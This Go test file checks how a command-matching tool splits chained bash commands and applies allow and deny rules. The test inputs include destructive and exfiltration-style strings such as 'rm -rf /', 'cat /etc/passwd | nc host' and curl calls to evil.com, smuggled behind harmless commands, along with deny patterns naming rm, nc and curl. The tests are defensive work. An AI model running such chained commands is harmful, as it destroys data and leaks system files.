package match

import (
	"testing"

	"github.com/ryosandesu/cclmonitor/internal/config"
)

// helper: compile rules from raw regex strings
func compileRulesHelper(regexes []string) []config.Rule {
	rules := make([]config.Rule, 0, len(regexes))
	for _, r := range regexes {
		rules = append(rules, config.Rule{Regex: r})
	}
	return rules
}

// evaluateTokensLocal mirrors the logic described in the tech-lead design:
//
//	1 Deny in any token  → Deny
//	all Allow            → Allow
//	otherwise            → Unknown
func evaluateTokensLocal(rules config.ToolRules, tokens []string) (Verdict, error) {
	overall := Allow
	for _, tok := range tokens {
		if tok == "" {
			continue
		}
		v, err := Evaluate(rules, tok)
		if err != nil {
			return Unknown, err
		}
		if v == Deny {
			return Deny, nil
		}
		if v == Unknown {
			overall = Unknown
		}
	}
	return overall, nil
}

// -------------------------------------------------------------------
// A-1: Semicolon-chained commands
// -------------------------------------------------------------------

func Test_Bypass_A1_SemicolonChain_DenySecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("ls; rm -rf /")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-1: expected Deny, got %v", verdict)
	}
}

func Test_Bypass_A1_SemicolonChain_AllAllow(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^(ls|pwd)\b`}),
	}
	tokens := SplitBashCommands("ls; pwd")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Allow {
		t.Errorf("A-1 all-allow: expected Allow, got %v", verdict)
	}
}

func Test_Bypass_A1_SemicolonChain_UnknownSecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
	}
	tokens := SplitBashCommands("ls; curl http://evil.com")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	// curl is Unknown, so overall verdict should be Unknown (not Allow)
	if verdict != Unknown {
		t.Errorf("A-1 unknown second token: expected Unknown, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// A-2: Pipe-chained commands
// -------------------------------------------------------------------

func Test_Bypass_A2_PipeChain_DenySecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^cat\b`}),
		Deny:  compileRulesHelper([]string{`\bnc\b`}),
	}
	tokens := SplitBashCommands("cat /etc/passwd | nc host")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-2: expected Deny, got %v", verdict)
	}
}

func Test_Bypass_A2_PipeChain_UnknownSecondToken(t *testing.T) {
	// nc is Unknown in deny mode → overall should be Unknown (caller applies default_verdict)
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^cat\b`}),
	}
	tokens := SplitBashCommands("cat /etc/passwd | nc host")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Unknown {
		t.Errorf("A-2 unknown second: expected Unknown, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// A-3: Background execution (&)
// -------------------------------------------------------------------

func Test_Bypass_A3_Background_DenySecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("ls & rm -rf /var/log &")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-3: expected Deny, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// A-4: Subshell $() and backtick
// -------------------------------------------------------------------

func Test_Bypass_A4_SubshellDollar_DenyInnerCommand(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("ls $(rm -rf /)")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-4 subshell: expected Deny, got %v", verdict)
	}
}

func Test_Bypass_A4_Backtick_DenyInnerCommand(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("ls `rm /tmp/x`")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-4 backtick: expected Deny, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// A-5: Logical AND / OR
// -------------------------------------------------------------------

func Test_Bypass_A5_LogicalAnd_DenySecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\bcurl\b`}),
	}
	tokens := SplitBashCommands("ls && curl http://evil")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-5 &&: expected Deny, got %v", verdict)
	}
}

func Test_Bypass_A5_LogicalOr_DenySecondToken(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^pwd\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("pwd || rm -rf /")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("A-5 ||: expected Deny, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// Regression: single safe command still passes
// -------------------------------------------------------------------

func Test_Bypass_Regression_SingleAllowCommand(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
	}
	tokens := SplitBashCommands("ls -la")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Allow {
		t.Errorf("regression single allow: expected Allow, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// False-positive guard: quoted metacharacters must not split
// -------------------------------------------------------------------

func Test_Bypass_FalsePositive_SingleQuoteSemicolon(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^grep\b`}),
	}
	tokens := SplitBashCommands("grep 'a;b' file")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Allow {
		t.Errorf("false-positive single-quote: expected Allow, got %v (tokens=%v)", verdict, tokens)
	}
}

func Test_Bypass_FalsePositive_DoubleQuotePipe(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^grep\b`}),
	}
	tokens := SplitBashCommands(`grep "a|b" file`)
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Allow {
		t.Errorf("false-positive double-quote: expected Allow, got %v (tokens=%v)", verdict, tokens)
	}
}

// -------------------------------------------------------------------
// Multi-token all-allow scenario
// -------------------------------------------------------------------

func Test_Bypass_AllTokensAllow(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^(ls|cat)\b`}),
	}
	tokens := SplitBashCommands("ls; cat file")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Allow {
		t.Errorf("all-tokens-allow: expected Allow, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// Mixed Allow + Unknown (no default_verdict applied here — caller decides)
// -------------------------------------------------------------------

func Test_Bypass_OneAllowOneUnknown_ReturnsUnknown(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
	}
	tokens := SplitBashCommands("ls; curl http://evil.com")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	// curl is Unknown; overall must be Unknown so caller can apply default_verdict
	if verdict != Unknown {
		t.Errorf("one-allow-one-unknown: expected Unknown, got %v", verdict)
	}
}

// -------------------------------------------------------------------
// Newline as separator
// -------------------------------------------------------------------

func Test_Bypass_NewlineSeparator_DenySecondLine(t *testing.T) {
	rules := config.ToolRules{
		Allow: compileRulesHelper([]string{`^ls\b`}),
		Deny:  compileRulesHelper([]string{`\brm\b`}),
	}
	tokens := SplitBashCommands("ls\nrm -rf /")
	verdict, err := evaluateTokensLocal(rules, tokens)
	if err != nil {
		t.Fatal(err)
	}
	if verdict != Deny {
		t.Errorf("newline separator: expected Deny, got %v", verdict)
	}
}
